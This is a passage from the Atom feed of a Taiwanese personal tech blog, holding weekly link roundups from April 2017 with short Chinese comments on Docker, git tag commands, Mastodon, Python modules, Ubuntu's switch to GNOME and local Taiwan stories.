&lt;li&gt;&lt;a href="https://read01.com/GPaLex.html"&gt;繼續使用iphone原裝包裝盒教你如何收納earpods耳機 - 壹讀&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;iphone買回家以後千萬不要急著把拆開的包裝盒扔掉，在以往教程當中我們已經學會了怎麼使用手機原裝包裝盒做diy手機架。可是盒子裡還有很多包材我們依然沒有用到的，例如裝earpod的耳機小盒子。我想各位跟我一樣，在打開i  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://appleuser.com/2014/05/16/wrap-iphone-earphones-without-tangles/"&gt;iPhone 耳機繞 8 字不打結收線法 | AppleUser&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;幾年前還在 Apple 店打工的時候，當時的前輩 Max 曾經傳授給我一個讓 iPhone 耳機線絕對不打結的收納方法，這起源於他當兵時擔任通信兵的線材收納法：繞 8 字。  &lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;後來收耳機線都用這個方法，幾乎不太打結，很棒。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;job&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/Oversea_Job/M.1382073074.A.C85.html"&gt;[歐洲] ARM Norway AS 面試經驗分享 - 看板 Oversea_Job - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;很詳細的面試經歷，而且竟然是在挪威，應該不算常見，挺有趣的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;linux&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://ablagoev.github.io/linux/adventures/commands/2017/02/19/adventures-in-usr-bin.html"&gt;Adventures in /usr/bin and the likes - Dormammu's Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;I just love Linux! For me it makes interacting with your computer fun and educational. I think if someone needs to learn about the core principles underlying an operating system and hardware, Linux is a great place to start.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://dpdk.org/"&gt;DPDK&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;DPDK is a Linux Foundation Project, developed by hundreds of contributors, supported by strong leading members, and used in a growing ecosystem.  DPDK is a set of libraries and drivers for fast packet processing.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;machine learning&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://chuansong.me/n/1720679451638"&gt;【論文解讀】Facebook 何凱明 Mask R-CNN 狙擊目標實例分割_人工智能頭條_傳送門&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;导读：自从将卷积神经网络引入了目标检测领域后，从rcnn到fast-rcnn，然后到end-to-end的faster-rcnn,除了yolo一枝独秀外，基本垄断了整个目标检测领域；而何凯明的resnet基本成了整个图像分类算法的巅峰。这一次，他们强强联手准  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;mastodon&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/@poga/%E6%9E%B6%E8%A8%AD%E4%BD%A0%E8%87%AA%E5%B7%B1%E7%9A%84-mastodon-instance-858a658e9494"&gt;架設你自己的 mastodon instance – Poga Po – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;mastodon 概念上類似 mail server：每個人都能架設他自己的 instance，每個 instance 之間都能互相溝通，使用者可以跨 instance follow、reply、reblog… 等等。  &lt;/li&gt;
&lt;li&gt;這篇描述了 &lt;a href="https://g0v.social"&gt;https://g0v.social&lt;/a&gt; 架設 Mastodon 的筆記，根據自己架設的友人表示，RoR 好肥（戰  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/bslatkin/effectivepython"&gt;GitHub - bslatkin/effectivepython: Effective Python: Source Code and Errata for the Book&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Hello! You've reached the official source code repository for Effective Python. To learn more about the book or contact the author, please visit the official website.  In this repository you can browse all of the source code included in the book.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;software engineering&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/@rdsubhas/10-modern-software-engineering-mistakes-bc67fbef4fc8"&gt;Modern Software Over-Engineering Mistakes – RDX – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Few things are guaranteed to increase all the time: Distance between stars, Entropy in the visible universe, and Fucking business requirements . Many articles say Dont over-engineer but don’t say why or how. Here are 10 clear examples.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;misc&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.inboundjournals.com/3-free-monitoring-tools-to-compare-your-facebook-page-with-the-competition/"&gt;與競品比較粉絲專頁的3個免費監測工具&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;社群經營是一個不斷優化的過程。經常為自己的社群經營作評估非常重要，而透過數據指標的分析，可以幫助品牌在社群的經營上逐步精進。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;深圳華強北真的是個神奇的地方，大概所有用過的 iPhone 都回流到這裡了吧。  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://forum.xda-developers.com/nexus-5x/general/4gb-ram-upgraded-nexus-5x-t3588743"&gt;4GB RAM upgraded of my Nexus 5X | LG Nexus 5X&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.cnbeta.com/articles/tech/603095.htm"&gt;老外Nexus 5X成磚寄去深圳：修好且升級到4G RAM_Google Android_cnBeta.COM&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/Gossiping/M.1492426304.A.892.html"&gt;Re: [新聞] 八田安葬烏山頭 愛台灣超越種族&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;比課本上還詳細的八田羽一歷史  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;trivia&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://pansci.asia/archives/110479"&gt;這個九九乘法表你小學沒背過！吠陀方形的千年奧秘 - PanSci 泛科學&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;古印度的奧妙  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E6%B0%B4%E7%85%99"&gt;水煙 - 维基百科，自由的百科全书&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;原來水煙起源於波斯啊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E9%BC%BB%E7%83%9F"&gt;鼻烟 - 维基百科，自由的百科全书&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;原來鼻煙起源於美洲印地安人  &lt;/li&gt;
&lt;li&gt;十六世紀初西班牙人  &lt;/li&gt;
&lt;li&gt;帶回歐洲後於十七世紀流行起來  &lt;/li&gt;
&lt;li&gt;清朝時傳入中國  &lt;/li&gt;
&lt;li&gt;一時蔚為風潮  &lt;/li&gt;
&lt;li&gt;後被旱菸、水煙、紙煙取代  &lt;/li&gt;
&lt;li&gt;於蒙古大為流行  &lt;/li&gt;
&lt;li&gt;至今仍有吸食鼻煙的習慣  &lt;/li&gt;
&lt;li&gt;甚至和社交禮儀有關  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="docker"></category><category term="facebook"></category><category term="gcp"></category><category term="github"></category><category term="golang"></category><category term="iphone"></category><category term="job"></category><category term="linux"></category><category term="machine learning"></category><category term="mastodon"></category><category term="misc"></category><category term="python"></category><category term="software engineering"></category><category term="taiwan"></category><category term="trivia"></category></entry><entry><title>Y2017W15</title><link href="https://blog.m157q.tw/posts/2017/04/17/y2017w15/" rel="alternate"></link><published>2017-05-01T20:50:44+08:00</published><updated>2017-05-01T20:50:44+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-04-17:posts/2017/04/17/y2017w15/</id><summary type="html">&lt;h3&gt;blog&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/@penk/3d-printing-to-mold-casting-f0c0c34601e0?source=rss-303bb4f38664"&gt;從 3D 列印到小量翻模生產 – Penk Chen – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;自幹烏克麗麗已經從手工到翻模生產了，有點猛。  &lt;/li&gt;
&lt;li&gt;看來又會是今年 COSCUP 的講題之一了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;facebook&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://parkerro.tw/%e7%ad%86%e8%a8%98facebook-%e7%b2%89%e7%b5%b2%e9%a0%81%ef%bc%8c%e6%96%b0%e5%a2%9e%e9%a0%81%e7%b1%a4%e7%9a%84%e6%96%b9%e6%b3%952016/"&gt;【筆記】Facebook 粉絲頁，新增頁籤的方法 (2016) - ParkerRo 趴克肉&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;公司的同事問的，順便查了一下，照這個設定就可以在粉絲專頁的左邊加上自訂的頁籤導到特定的網頁，可以拿來用於活動用，在動態上也會變成可以直接互動的狀態，使用者體驗會比較好一點。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;github&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/@siuying/mastodon-7d4e8070d6f0"&gt;Mastodon – siuying – Medium&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/tootsuite/mastodon"&gt;tootsuite/mastodon: A GNU Social-compatible microblogging server&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Mastodon is a free, open-source social network server. A decentralized solution to commercial platforms, it avoids the risks of a single company monopolizing your communication. Anyone can run Mastodon and participate in the social network seamlessly.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;一個用 RoR 寫的仿 Twitter 的分散式 SNS，每個人都可以自己架 node，並和其他 node 的人溝通。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;google&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.autodraw.com"&gt;AutoDraw&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;利用 Machine Learning 的方式來推測你想塗鴉什麼圖，讓每個人都可以畫出不錯的圖片。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;ios&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/libimobiledevice/libimobiledevice"&gt;GitHub - libimobiledevice/libimobiledevice: A cross-platform protocol library to communicate with iOS devices&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;最近買了一支 iPhone SE，survey 一些在 Linux 上使用 iOS device 的東西。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;javascript&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/SheetJS/js-xlsx"&gt;SheetJS/js-xlsx: Spreadsheet Parser and Writer&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Parser and writer for various spreadsheet formats. Pure-JS cleanroom implementation from official specifications and related documents.  The node version automatically requires modules for additional features.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;用來將許多 Speardsheet 格式互轉的工具  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;k8s&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/google-cloud/running-workloads-in-kubernetes-86194d133593"&gt;Running Workloads in Kubernetes – Google Cloud Platform — Community – Medium&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;linux&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.jianshu.com/p/86dd6e34ce91"&gt;Ubuntu放棄戰鬥, Linux桌面的悲哀 - 簡書&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Ubuntu 做为全世界Linux界的桌面先驱者和创新者，突然宣布放弃自己多年开发的Unity, 相当于在桌面领域，直接放弃了战斗向微软投降，不仅仅是Linux桌面的悲哀，更是对于全球Linux黑客坚信Linux必胜信心的极大打击。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;Ubuntu 宣佈之後的預設桌面環境改回使用 Gnome 3，而不是自己開發的 Unity  &lt;/li&gt;
&lt;li&gt;想當年換成 Unity 真的覺得很不好用，灌了 Ubuntu 12.04 以後還是灌了個 Gnome 3。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://pymotw.com/3/weakref/"&gt;weakref — Impermanent References to Objects — PyMOTW 3&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;剛好最近看 Effective Python 也有看到這個 module  &lt;/li&gt;
&lt;li&gt;用來產生 weak reference，來避免有時 copy 出一個 strong reference 後並沒有用到，但在 GC 的時候，reference count 會造成非零而造成記憶體無法被有效運用的情況。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;vim&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/vimwiki/vimwiki"&gt;vimwiki/vimwiki: Personal Wiki for Vim&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Vimwiki is a personal wiki for Vim -- a number of linked text files that have their own syntax highlighting.  To do a quick start press &lt;Leader&gt;ww (this is usually \ww) to go to your index wiki file. By default it is located in ~/vimwiki/index.wiki.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;可以用 Vim 直接編寫 Wiki，看到朋友說想用來架個人的 blog，我想我還是維持現在用 Pelican 寫 markdown 產生 static site 的方式就好。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;web&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://frontendmasters.com/books/front-end-handbook/2017/"&gt;Introduction · GitBook&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;寫的很完整的 Web Front-end 大全  &lt;/li&gt;
&lt;li&gt;雖然不太碰 Web Front-end，還是紀錄一下。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;misc&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=leFuF-zoVzA"&gt;How I Made My Own iPhone - in China - YouTube&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;靠 這好屌  &lt;/li&gt;
&lt;li&gt;自己組了一台 iPhone 6S  &lt;/li&gt;
&lt;li&gt;深圳 華強北 這地方真的是太神奇了  &lt;/li&gt;
&lt;li&gt;全部的蘋果零件都買得到  &lt;/li&gt;
&lt;li&gt;跟裝電腦一樣  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.facebook.com/chuck158207/posts/1712311465451647"&gt;朱宥勳 - 【看臉書學作文（？）】...&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇分析了全聯總裁的道歉文  &lt;/li&gt;
&lt;li&gt;如果國文課都這樣上的話應該會很有趣的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;ptt&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/sex/M.1492074019.A.207.html"&gt;Re: [討論] 如何讓自己只做春夢? - 看板 sex - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;如何做清醒夢的方法  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://npost.tw/archives/33511"&gt;曾經想當「靈媒社工師」，終究找回助人天命／專訪《通靈少女》原始角色劉柏君 - NPOst 公益交流站&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;《通靈少女》主角的原型  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="blog"></category><category term="facebook"></category><category term="github"></category><category term="google"></category><category term="ios"></category><category term="javascript"></category><category term="k8s"></category><category term="linux"></category><category term="misc"></category><category term="ptt"></category><category term="python"></category><category term="taiwan"></category><category term="vim"></category><category term="web"></category></entry><entry><title>Y2017W14</title><link href="https://blog.m157q.tw/posts/2017/04/10/y2017w14/" rel="alternate"></link><published>2017-05-01T20:29:16+08:00</published><updated>2017-05-01T20:29:16+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-04-10:posts/2017/04/10/y2017w14/</id><summary type="html">&lt;h3&gt;docker&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/anildigital/862675ec1b7bccabc311"&gt;Remove dangling docker images&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Remove dangling docker images View gist:862675ec1b7bccabc311 Raw gistfile1.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;因為同事問了，所以就找了一下。  &lt;/li&gt;
&lt;li&gt;我自己是用 &lt;code&gt;docker images -aqf dangling=true | xargs --no-run-if-empty docker rmi&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;gcp&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloud-playground.appspot.com/playground/"&gt;Cloud Playground&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/googlearchive/cloud-playground"&gt;https://github.com/googlearchive/cloud-playground&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;算是 Google App Engine 的火力展示吧，用 GAE 架了一個可以快速 fork and deploy GAE service 的網站  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;git&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/7813194/how-do-i-edit-an-existing-tag-message-in-git"&gt;git tag - How do I edit an existing tag message in git? - Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;git tag &amp;lt;tag name&amp;gt; &amp;lt;tag name&amp;gt; -f -m "&amp;lt;new message&amp;gt;"&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;基本上就是強制 overwrite  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/1028649/how-do-you-rename-a-git-tag"&gt;How do you rename a Git tag? - Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;git tag new old&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;git tag -d old&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;git push origin :refs/tags/old&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;git push --tags&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;基本上就是把舊的複製到新的以後，在把舊的 local 跟 remote 砍掉，再把更新 push 到 remote  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;golang&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.wu-boy.com/2017/04/5-reasons-why-we-switched-from-python-to-go/"&gt;五大理由從 Python 轉到 Go 語言 | 小惡魔 - 電腦技術 - 工作筆記 - AppleBOY&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;都算滿務實的理由  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;job&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/Soft_Job/M.1491689771.A.CCF.html"&gt;[心得] 歐洲工作&amp;amp;面試心得 - 看板 Soft_Job - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;挺不錯的經驗，在阿姆斯特丹工作好像真的很棒啊。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;linux&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://szlin.me/2017/04/05/linux-kernel-%e5%af%86%e7%a2%bc%e5%ad%b8%e6%bc%94%e7%ae%97%e6%b3%95%e5%af%a6%e4%bd%9c%e6%b5%81%e7%a8%8b/"&gt;Linux Kernel 密碼學演算法實作流程 – SZ Lin  &amp;amp; Embedded Linux&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;misc&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://mp.weixin.qq.com/s?__biz=MjM5MTE4Nzk1NA%3D%3D&amp;amp;mid=2650741697&amp;amp;idx=1&amp;amp;sn=9e460ef496d57164c27b617ff17a78f8&amp;amp;chksm=beb2ed5c89c5644a2161f4151ec3cca8e605538435b772a911646d62f9f7de4ccaa9d5125fd7&amp;amp;mpshare=1&amp;amp;scene=4&amp;amp;srcid=0402GzvLtZhgODBSpKPlLwoC#rd"&gt;参与这场线上大战之后，我觉得人类未来还是有希望的&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Reddit 的愚人節  &lt;/li&gt;
&lt;li&gt;好酷啊  &lt;/li&gt;
&lt;li&gt;完全沒有參與到  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;news&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://opensource.googleblog.com/2017/04/noto-serif-cjk-is-here.html"&gt;Google Open Source Blog: Noto Serif CJK is here!&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.gslin.org/archives/2017/04/04/7229/tim-berners-lee-%e6%8b%bf%e4%b8%8b-2016-%e5%b9%b4-turing-award/"&gt;Tim Berners-Lee 拿下 2016 年 Turing Award | Gea-Suan Lin's BLOG&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.gslin.org/archives/2017/04/04/7224/adobe-%e8%88%87-google-%e5%90%88%e4%bd%9c%e6%8e%a8%e5%87%ba-noto-serif-cjk-%e6%80%9d%e6%ba%90%e5%ae%8b%e9%ab%94/"&gt;Adobe 與 Google 合作推出 Noto Serif CJK (思源宋體) | Gea-Suan Lin's BLOG&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.omgubuntu.co.uk/2017/04/ubuntu-18-04-ship-gnome-desktop-not-unity"&gt;Ubuntu 18.04 To Ship with GNOME Desktop, Not Unity - OMG! Ubuntu!&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Ubuntu 18.04 LTS will use GNOME as its default desktop environment, and not Unity 8 — or even Unity 7.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;ptt&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/CCRomance/M.1491078577.A.39F.html"&gt;[閒聊] 我媽的異國婚姻&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;大概是第一次花這麼多時間看 CCR 版的文章，作者的文筆很好，真的可以當小品文來看，有時候真實的人生就是比小說來的神奇啊。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://doughellmann.com/blog/2017/04/03/profile-and-pstats-performance-analysis-pymotw-3/"&gt;profile and pstats — Performance Analysis — PyMOTW 3 – Doug Hellmann&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Python 的 built-in module 就有可以做 profiling 的工具  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;web&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Progressive_web_app"&gt;Progressive web app - Wikipedia&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Progressive Web App (PWA) is a term used to denote a new software development methodology. Unlike traditional applications, progressive web apps are a hybrid of regular web pages (or websites) and a mobile application.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;因為最近 &lt;a href="https://mobile.twitter.com"&gt;https://mobile.twitter.com&lt;/a&gt; 用 Node.js, React.js 重寫，改善了不少效能。裡頭提到了 PWA，因為沒聽過而去查了一下  &lt;/li&gt;
&lt;li&gt;看起來就是 website 但故意設計的跟 App 的感覺一樣，讓使用者在網頁版與手機上的 UX 是一樣的  &lt;/li&gt;
&lt;li&gt;詳細改寫的細節在 Twitter Engineering blog 這篇：&lt;a href="https://blog.twitter.com/2017/how-we-built-twitter-lite"&gt;https://blog.twitter.com/2017/how-we-built-twitter-lite&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/%E9%AD%94%E9%AC%BC%E7%9A%84%E6%89%8B%E7%A8%BF/%E5%9C%8B%E9%81%93%E5%9B%9B%E6%96%AC%E9%A6%96%E4%BA%86%E5%8F%B0%E7%81%A3%E7%AC%AC%E4%B8%80%E6%A2%9D%E8%87%AA%E8%A1%8C%E8%BB%8A%E9%81%93-8ca7c80e6bd1"&gt;國道四斬首了台灣第一條自行車道 – 魔鬼的手稿 – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;近20年來，國道四號，在老台中山區是一個非常複雜的概念。這一條高速公路，由台中清水起，大略沿大甲溪往東而行，至豐原東北止，已於2001年11月16日通車，但是，後續工程還沒完，國道四後面一分為二，還要接一條打山洞  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;身為一個豐原人，沒看這篇還真的不知道東豐自行車隧道有這麼多的牽扯，大概是因為最近在看紙牌屋的關係，所以對於這些大概也能有些想像。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/TaichungBun/M.1491294485.A.A97.html"&gt;[食記] 全台最容易讓女友落淚的餐廳 - 看板 TaichungBun - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這餐廳... 「夜間X行」真的太狂了，超級像九把刀的小說會出現的內容...  &lt;/li&gt;
&lt;li&gt;雖然身為一個台中人，但沒聽過這間餐廳。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;trivia&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://0.30000000000000004.com/"&gt;0.30000000000000004 - Floating Point Math&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;好像還是有不少人不知道這問題  &lt;/li&gt;
&lt;li&gt;0.1+0.2 != 0.3  &lt;/li&gt;
&lt;li&gt;浮點數運算的誤差  &lt;/li&gt;
&lt;li&gt;數值方法的課程應該必提吧？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="docker"></category><category term="gcp"></category><category term="git"></category><category term="golang"></category><category term="job"></category><category term="linux"></category><category term="misc"></category><category term="news"></category><category term="ptt"></category><category term="python"></category><category term="taiwan"></category><category term="trivia"></category><category term="web"></category></entry><entry><title>Y2017W13</title><link href="https://blog.m157q.tw/posts/2017/04/03/y2017w13/" rel="alternate"></link><published>2017-05-01T20:04:26+08:00</published><updated>2017-05-01T20:04:26+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-04-03:posts/2017/04/03/y2017w13/</id><summary type="html">&lt;h3&gt;blog&lt;/h3&gt;
&lt;ul&gt;
